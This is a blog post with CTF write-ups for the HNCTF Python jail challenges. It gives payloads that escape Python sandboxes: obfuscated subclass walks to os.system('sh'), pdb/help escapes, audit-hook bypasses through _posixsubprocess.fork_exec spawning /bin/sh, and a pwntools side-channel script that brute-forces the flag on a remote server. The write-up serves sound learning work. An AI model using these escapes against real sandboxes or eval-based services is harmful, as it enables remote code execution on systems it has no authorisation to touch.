<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="Moyao の小屋" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="Moyao の小屋" type="application/atom+xml"><link rel="alternate" type="application/json" title="Moyao の小屋" href="https://demoyao100.github.io/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="stylesheet" href="/css/app.css?v=0.4.2"><link rel="modulepreload" href="/js/chunk-346TEOXD.js"></link><link rel="modulepreload" href="/js/chunk-QA6RGM2S.js"></link><link rel="modulepreload" href="/js/chunk-QAWHJ5B3.js"></link><link rel="modulepreload" href="/js/index.esm-SMPOVEZ5.js"></link><link rel="modulepreload" href="/js/post-H6TTLEOZ.js"></link><link rel="modulepreload" href="/js/quicklink-RU6FD7L7.js"></link><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1gicit31ffoj20zk0m8naf.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg" as="image" fetchpriority="high"><link rel="preload" href="https://tva4.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg" as="image" fetchpriority="high"><meta name="keywords" content="ctf,"/><meta name="description" content="&lt;h4 id=&quot;preface&quot;&gt;&lt;a class=&quot;anchor&quot; href=&quot;#preface&quot;&gt;#&lt;/a&gt; preface&lt;/h4&gt;
&lt;h6 id=&quot;thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail&quot;&gt;&lt;a class=&quot;anchor&quot; href=&quot;#thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail&quot;&gt;#&lt;/a&gt; Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn't work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems&lt;a href=&quot;https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/&quot;&gt;pythonJail&lt;/a&gt;.&lt;/h6&gt;
&lt;p&gt;&lt;/p&gt;"/><link rel="canonical" href="https://demoyao100.github.io/2022/11/01/pythonJail/"><title>pythonJail</title><meta name="generator" content="Hexo 7.0.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">pythonJail</h1><div class="meta"><span class="item" title="Created: 2022-11-01 15:48:11"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">Posted on</span><time itemprop="dateCreated datePublished" datetime="2022-11-01T15:48:11+08:00">2022-11-01</time></span><span class="item" title="Symbols count in article"><span class="icon"><i class="ic i-pen"></i></span><span class="text">Symbols count in article</span><span>12k</span><span class="text">words</span></span><span class="item" title="Reading time"><span class="icon"><i class="ic i-clock"></i></span><span class="text">Reading time</span><span>11 mins.</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="Toggle navigation bar"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">testName</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1gicit31ffoj20zk0m8naf.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg&quot;);"></li><li class="item" style="background-image: url(&quot;https://tva4.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">Home</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="en"><link itemprop="mainEntityOfPage" href="https://demoyao100.github.io/2022/11/01/pythonJail/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="Moyao"/><meta itemprop="description" content="Hi,I'm Moyao, Write down something interesting I met
feel free to mail me if you have something wanted to talk about
mail: &amp;lt;moyaoxue@outlook.com&amp;gt;
"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="Moyao の小屋"/></span><div class="body md" itemprop="articleBody"><h4 id="preface"><a class="anchor" href="#preface">#</a> preface</h4>
<h6 id="thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail"><a class="anchor" href="#thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail">#</a> Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn't work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h6>
<p><span id="more"></span></p>
<h3 id="level-1"><a class="anchor" href="#level-1">#</a> LEVEL 1</h3>
<p><img loading="lazy" data-src="pythonJail/level1.png" alt="level1"></p>
<p>From the function filter, we sees that the symbol [&quot; ' ` i b] is banned. Which means (Show subclasses with tuple)  <code> ().\__class\__.\__base\__.\__subclasses\__()</code></p>
<p>is not allowed. What's more, symbol ' and &quot; is banned, so it come to us that we may can use  <code>chr</code>  to splicing a string that we wanted.</p>
<p>Two possible payload:</p>
<blockquote>
<p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>
(().__class__.__base__.__subclasses__()[-4].__init__.__globals__<a href="'sh'">'system'</a>)</p>
</blockquote>
<blockquote>
<p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()<br>
from <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578986988">thisBlog</a></p>
</blockquote>
<p><img loading="lazy" data-src="pythonJail/level1wp.png" alt="level1pos"></p>
<h3 id="level-2"><a class="anchor" href="#level-2">#</a> LEVEL 2</h3>
<p><img loading="lazy" data-src="pythonJail/level2.png" alt="level1"></p>
<p>The length of the payload is limited to 13.</p>
<p>The answer according to 空白 is the function &lt;c style=&quot;color: #FF0000&quot;&gt;&quot;breakpoint ()&quot;&lt;/c&gt;, which I didn't figure out yet. However, there is another way. Use  <code>eval(input())</code>  so that the program receive once again for your input! Seems a little bit like  <code>/?cmd=system($_POST[1]);$1=ls</code>  to escape the filter in php right?</p>
<h3 id="level-3"><a class="anchor" href="#level-3">#</a> LEVEL 3</h3>
<p><img loading="lazy" data-src="pythonJail/level3.png" alt="level3"></p>
<p>This time, the maximum length of our payload is down to 7.</p>
<p>I didn't quite understand yet, but function  <code>help()</code>  can help you passby the 7 words limit. Here is when I tried others' payload, quite amazing and when I am available I shall come back to study it.</p>
<blockquote></blockquote>
<p><img loading="lazy" data-src="pythonJail/level3wp.png" alt="level3"></p>
<h3 id="python2-input-jail"><a class="anchor" href="#python2-input-jail">#</a> PYTHON2 INPUT JAIL</h3>
<p><img loading="lazy" data-src="pythonJail/input(jail).png" alt="input(jail)"></p>
<p>python2, another thing I am not familiar with...</p>
<p>Looking up others' write up...</p>
<p><img loading="lazy" data-src="pythonJail/input(jail)wp.png" alt="input(jail)"></p>
<h3 id="level-25"><a class="anchor" href="#level-25">#</a> LEVEL 2.5</h3>
<p><img loading="lazy" data-src="pythonJail/level2.5.png" alt="level2.5"></p>
<p>We can use  <code>breakpoint()</code>  to go into pdb, and rce is possible.</p>
<h3 id="lake"><a class="anchor" href="#lake">#</a> LAKE</h3>
<p><img loading="lazy" data-src="pythonJail/lake.png" alt="lake"></p>
<h6 id="strange-christencrazyman-seems-to-name-it-lake-from-leak"><a class="anchor" href="#strange-christencrazyman-seems-to-name-it-lake-from-leak">#</a> Strange christen.(Crazyman seems to name it 'lake' from 'leak'?)</h6>
<p>Use  <code>globals()</code>  to leak the key. And then get shell.</p>
<h3 id="lke"><a class="anchor" href="#lke">#</a> L@KE</h3>
<p><img loading="lazy" data-src="pythonJail/l%40ke.png" alt="l@ke"></p>
<h6 id="another-strange-christen"><a class="anchor" href="#another-strange-christen">#</a> Another strange christen...</h6>
<p>The maxinum length of payload is now 6, so only  <code>help()</code>  is possible.</p>
<p>But unlike cases above, this time module 'os' is destory or whatever. Now we comes to the base reason why we use 'os' above.  <code>help()</code>  can actually get you into any module in the python file, which includes  <code>__main__</code> ! And surely, the key can be found inside.</p>
<p>&lt;br&gt;</p>
<h5 id="ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code"><a class="anchor" href="#ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code">#</a> OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.</h5>
<p>&lt;br&gt;</p>
<h3 id="level-5"><a class="anchor" href="#level-5">#</a> LEVEL 5</h3>
<p><img loading="lazy" data-src="pythonJail/level5.png" alt="level5"></p>
<p>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.</p>
<h3 id="level-4"><a class="anchor" href="#level-4">#</a> LEVEL 4</h3>
<h6 id="why-is-it-4-after-5-i-dont-know"><a class="anchor" href="#why-is-it-4-after-5-i-dont-know">#</a> (Why is it 4 after 5 I don't know...)</h6>
<p>4 bytes rce, seems impossible, so lets just guass it use  <code>os.system(input_data)</code>  to get your input and bingo.</p>
<p><img loading="lazy" data-src="pythonJail/level4.png" alt="level4"></p>
<h3 id="lake-2"><a class="anchor" href="#lake-2">#</a> LAkE</h3>
<p><img loading="lazy" data-src="pythonJail/laKelaKe.png" alt="laKe"></p>
<p>This time it imports  <code>sys</code>  module with <a target="_blank" rel="noopener" href="https://peps.python.org/pep-0578/">audit hook</a>, and direct RCE function like  <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code>  is not available. Whats more,  <code>compile、eval、exec、open</code>  is unfetchable. However, there use  <code>random.setstate()</code>  to generate its random number, which is base on Mersenne <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95">Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one 'eval' in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?</p>
<p>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with  <code>lambda</code> . Some case can be view below:</p>
<pre><code>https://ctftime.org/writeup/21982

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
</code></pre>
<p>Second, if we  <code>import random</code>  and print  <code>random.getstate</code>  at the beginning, we got a tuple back. which may look like: <code>(3, (..., 624), None)</code> . The first value '3' and the last value 'None' is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.</p>
<h5 id="payload"><a class="anchor" href="#payload">#</a> payload:</h5>
<pre><code>[random:=\_\_import__('random'), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
</code></pre>
<h3 id="level-51"><a class="anchor" href="#level-51">#</a> LEVEL 5.1</h3>
<p>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.</p>
<p><code>nc</code>  and  <code>dir()</code> (as it tells you to), found  <code>my_flag</code> , try  <code>list(getattr(my_flag,'flag))</code> , got a  <code>AttributeError: 'flag_level5' object has no attribute 'flag'</code> . So payload is  <code>list(getattr(my_flag,'flag_level5'))</code></p>
<p>Another way to solve this problem(though quite similar, the latter gets its shell)</p>
<p><img loading="lazy" data-src="pythonJail/level5.1_1.png" alt="level5.1_1"><br>
<img loading="lazy" data-src="pythonJail/level5.1_2.png" alt="level5.1_2"></p>
<h3 id="lak3"><a class="anchor" href="#lak3">#</a> LAK3</h3>
<p><img loading="lazy" data-src="pythonJail/lak3.png" alt="lak3"></p>
<p>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is  <code>__import__('sys')._getframe(1).f_locals['right_guesser_question_answer']</code></p>
<h5 id="a-good-blog-can-refer"><a class="anchor" href="#a-good-blog-can-refer">#</a> <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/21982">a good blog can refer</a></h5>
<h3 id="type-chnnel"><a class="anchor" href="#type-chnnel">#</a> tyPe Ch@nnEl</h3>
<p><img loading="lazy" data-src="pythonJail/sideChannel.png" alt="sideChannel"></p>
<p>I haven't quite understand yet. So I will put the payload beforehand:</p>
<p>One possible:</p>
<pre><code>from pwn import *
from tqdm import trange

class Gao:
    def __init__(self):
        self.known = ''

def init(self):
    # self.conn = process(['python3', './server_type.py'])
    self.conn = remote('1.14.71.254', 28563)

def gao(self):
    payload = '((1)if(type(flag.split())(flag.encode()).pop(&#123;pos&#125;)^&#123;val&#125;)else(True))'
    i = len(self.known)
    while True:
        for j in trange(32, 128):
            cur_payload = payload.format(pos=i, val=j)
            self.init()
            self.conn.sendlineafter('Payload:', cur_payload)
            s = self.conn.recvline()
            self.conn.close()
            if (b'Try' in s):
                return
            elif (b'bool' in s):
                self.known += chr(j)
                print(self.known)
                print(self.known)
                print(self.known)
                break
        else:
            raise Exception('GG simida')            
        i += 1
if __name__ == '__main__':
    g = Gao()
    g.gao()
</code></pre>
<p>↑ Can took some time(when I tried)</p>
<p>Officail:</p>
<pre><code>for i in range(len(flag), len(flag)+100): # flag length
for guess in chars: # all possible chars
    print(&quot;guess: &quot;, bytes(flag), chr(guess))
    payload = f&quot;type(type(flag).mro())(type(type(flag).mro())(flag).pop(&#123;i&#125;).encode()).remove(&#123;guess&#125;)&quot;
</code></pre>
<h3 id="level-4-2"><a class="anchor" href="#level-4-2">#</a> LEVEL 4</h3>
<h6 id="level-4-again"><a class="anchor" href="#level-4-again">#</a> level 4 again</h6>
<p><img loading="lazy" data-src="pythonJail/level4_1.png" alt="level4_1"></p>
<p>Quite similar as before, just use  <code>bytes().decode()</code>  to pass the black list.</p>
<p><img loading="lazy" data-src="pythonJail/level4wp1.png" alt="level4_1wp1"><br>
<img loading="lazy" data-src="pythonJail/level4wp2.png" alt="level4_1wp2"></p>
<p>payload:</p>
<pre><code>().__class__.__base__.__subclasses__()
</code></pre>
<h5 id><a class="anchor" href="#">#</a> </h5>
<p>​    ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong>[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</p>
<p>There is another solution to this problem: I am not sure I fully understand it, so I put a <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/579057932">link</a> here beforehand.</p>
<h5 id="payload-2"><a class="anchor" href="#payload-2">#</a> payload:</h5>
<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
</code></pre>
<p><img loading="lazy" data-src="pythonJail/level4wp_3.png" alt="level4wp3"></p>
<h3 id="level-405"><a class="anchor" href="#level-405">#</a> LEVEL 4.0.5</h3>
<p>Same payload as last one.</p>
<p><img loading="lazy" data-src="pythonJail/level4.0.5.png" alt="level4.0.5"></p>
<h3 id="level-41"><a class="anchor" href="#level-41">#</a> LEVEL 4.1</h3>
<p>Quite same as before.</p>
<p><img loading="lazy" data-src="pythonJail/level4.1wp1.png" alt="level4.1"></p>
<p>Ps, the  <code>bytes</code>  is now banned, but still you can use  <code>show subclassed with tuples</code>  to replace, like this:</p>
<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
</code></pre>
<h3 id="level-42"><a class="anchor" href="#level-42">#</a> LEVEL 4.2</h3>
<p>Quite same as before..</p>
<p><img loading="lazy" data-src="pythonJail/level4.2wp.png" alt="level4.2"></p>
<h5 id="or-rather-use-join"><a class="anchor" href="#or-rather-use-join">#</a> Or rather use  <code>join</code> :</h5>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])](<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]]))</span><br></pre></td></tr></table></figure></p>
<h3 id="level-43"><a class="anchor" href="#level-43">#</a> LEVEL 4.3</h3>
<p>Quite same as before...</p>
<p><img loading="lazy" data-src="pythonJail/level4.3wp.png" alt="level4.3"></p>
<p>&lt;br&gt;</p>
<h5 id="the-next-few-levels-are-become-harder-and-harder"><a class="anchor" href="#the-next-few-levels-are-become-harder-and-harder">#</a> The next few levels are become harder and harder.</h5>
<p>&lt;br&gt;</p>
<h3 id="level-6"><a class="anchor" href="#level-6">#</a> LEVEL 6</h3>
<h4 id="repetition"><a class="anchor" href="#repetition">#</a> repetition:</h4>
<p><img loading="lazy" data-src="pythonJail/level6wp1.png" alt="level6wp1"><br>
<img loading="lazy" data-src="pythonJail/level6wp2.png" alt="level6wp2"><br>
<img loading="lazy" data-src="pythonJail/level6wp3.png" alt="level6wp3"></p>
<h5 id="link-that-may-help-you"><a class="anchor" href="#link-that-may-help-you">#</a> <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/31883">link that may help you</a></h5>
<p>The basic idea is to RCE with  <code>_posixsubprocess.fork_exec</code> . If we import it directly, it will trigger the audit hook. But we can pass it by using  <code>__builtins__['__loader__'].load_module('_posixsubprocess')</code>  or  <code>__loader__.load_module('_posixsubprocess')</code> . Also, due to its repeatedly exct, we just shell like this:</p>
<pre><code>import os
__loader__.load_module('_posixsubprocess').fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
</code></pre>
<h3 id="level-61"><a class="anchor" href="#level-61">#</a> LEVEL 6.1</h3>
<p>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.</p>
<p><img loading="lazy" data-src="pythonJail/level6.1wp.png" alt="level6.1wp"></p>
<h5 id="payload-3"><a class="anchor" href="#payload-3">#</a> payload:</h5>
<pre><code>[os := __import__('os'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
</code></pre>
<h5 id="or"><a class="anchor" href="#or">#</a> or</h5>
<pre><code>[os := __import__('os'), itertools := __loader__.load_module('itertools'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
</code></pre>
<h3 id="safeeval"><a class="anchor" href="#safeeval">#</a> SAFEEVAL</h3>
<p>Use lambda to wrap up RCE</p>
<p>payload:</p>
<pre><code>(lambda: __import__('os').system('sh'))()
</code></pre>
<p><img loading="lazy" data-src="pythonJail/safeeval_1.png" alt="safeeval"><br>
<img loading="lazy" data-src="pythonJail/safeeval_2.png" alt="safeeval"></p>
<h3 id="level7"><a class="anchor" href="#level7">#</a> LEVEL7</h3>
<h6 id="come-back-later-to-try-to-figure-it-out"><a class="anchor" href="#come-back-later-to-try-to-figure-it-out">#</a> Come back later to try to figure it out...</h6>
<p>payload:</p>
<blockquote>
<p>@exec<br>
@input<br>
class X: pass</p>
</blockquote>
<blockquote>
<p><strong>import</strong>('os').system('sh')</p>
</blockquote>
<h5 id="blog"><a class="anchor" href="#blog">#</a> <a target="_blank" rel="noopener" href="https://gynvael.coldwind.pl/n/python_sandbox_escape">blog</a></h5>
<pre><code>↑# [organizers] Robin_Jadoul solution↑
</code></pre>
<p><img loading="lazy" data-src="pythonJail/level7wp1.png" alt="level7"><br>
<img loading="lazy" data-src="pythonJail/level7wp2.png" alt="level7"></p>
<h3 id="ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail"><a class="anchor" href="#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail">#</a> Ok, so that's the end of the hnctf. There are some thing that may help you get further about pyjail:</h3>
<pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape

https://www.youtube.com/watch?v=Ub_BMOMDOx0

https://zhuanlan.zhihu.com/p/578966149
</code></pre>
<div class="tags"><a href="/tags/ctf/" rel="tag"><i class="ic i-tag"></i>ctf</a><a href="/tags/jail/" rel="tag"><i class="ic i-tag"></i>jail</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">Edited on</span><time title="Modified: 2023-09-18 13:58:12" itemprop="dateModified" datetime="2023-09-18T13:58:12+08:00">2023-09-18</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>Donate</button><p>Give me a cup of [coffee]~(￣▽￣)~*</p><div id="qr"><div><img loading="lazy" data-src="/assets/wechatpay.png" alt="Moyao WeChat Pay"/><p>WeChat Pay</p></div><div><img loading="lazy" data-src="/assets/alipay.png" alt="Moyao Alipay"/><p>Alipay</p></div></div></div><div id="copyright"><ul><li class="author"><strong>Post author: </strong>Moyao<i class="ic i-at"><em>@</em></i>Moyao の小屋</li><li class="link"><strong>Post link: </strong><a href="https://demoyao100.github.io/2022/11/01/pythonJail/" title="pythonJail">https://demoyao100.github.io/2022/11/01/pythonJail/</a></li><li class="license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> unless stating additionally.</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/09/25/Changes-of-Python-API-in-IDA/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicis3attqj20zk0m8k7l.jpg" title="Changes of Python API in IDA"><span class="type">Previous Post</span><h3>Changes of Python API in IDA</h3></a></div><div class="item right"><a href="/2022/11/02/hnctfRe/" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicis3attqj20zk0m8k7l.jpg" title="hnctfRe"><span class="type">Next Post</span><h3>hnctfRe</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="Contents"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#preface"><span class="toc-number">1.</span> <span class="toc-text"> preface</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#thanks-to-%E7%A9%BA%E7%99%BDcrazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail"><span class="toc-number">1.0.1.</span> <span class="toc-text"> Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn&#39;t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problemspythonJail.</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number"></span> <span class="toc-text"> LEVEL 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number"></span> <span class="toc-text"> LEVEL 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3"><span class="toc-number"></span> <span class="toc-text"> LEVEL 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python2-input-jail"><span class="toc-number"></span> <span class="toc-text"> PYTHON2 INPUT JAIL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-25"><span class="toc-number"></span> <span class="toc-text"> LEVEL 2.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lake"><span class="toc-number"></span> <span class="toc-text"> LAKE</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#strange-christencrazyman-seems-to-name-it-lake-from-leak"><span class="toc-number">0.0.1.</span> <span class="toc-text"> Strange christen.(Crazyman seems to name it &#39;lake&#39; from &#39;leak&#39;?)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lke"><span class="toc-number"></span> <span class="toc-text"> L@KE</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#another-strange-christen"><span class="toc-number">0.0.1.</span> <span class="toc-text"> Another strange christen...</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code"><span class="toc-number">0.1.</span> <span class="toc-text"> OK, now we&#39;ve go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5"><span class="toc-number"></span> <span class="toc-text"> LEVEL 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4"><span class="toc-number"></span> <span class="toc-text"> LEVEL 4</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#why-is-it-4-after-5-i-dont-know"><span class="toc-number">0.0.1.</span> <span class="toc-text"> (Why is it 4 after 5 I don&#39;t know...)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a 